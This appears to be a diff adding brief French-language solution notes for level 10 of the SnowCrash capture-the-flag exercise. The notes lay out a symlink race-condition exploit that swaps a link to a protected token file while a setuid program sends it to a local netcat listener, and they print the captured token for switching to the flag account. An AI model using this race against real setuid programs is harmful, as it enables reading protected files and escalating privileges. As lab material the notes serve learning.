@@ -1,0 +1,20 @@
+mkdir /tmp/lol
+touch /tmp/lol/lol.sh
+chmod 755 /tmp/lol/lol.sh
+sur un autre term sur snowcrash, nc -lk 6969
+
+#!/usr/bin/sh
+ln -fs /tmp/lol/lol.sh /tmp/lol/fdp
+~/level10 /tmp/lol/fdp 127.0.0.1&
+pwd
+pwd
+pwd
+pwd
+pwd
+pwd
+pwd
+pwd
+ln -fs ~/token /tmp/lol/fdp
+give woupa2yuojeeaaed06riuj63c
+su flag10 with it
+done
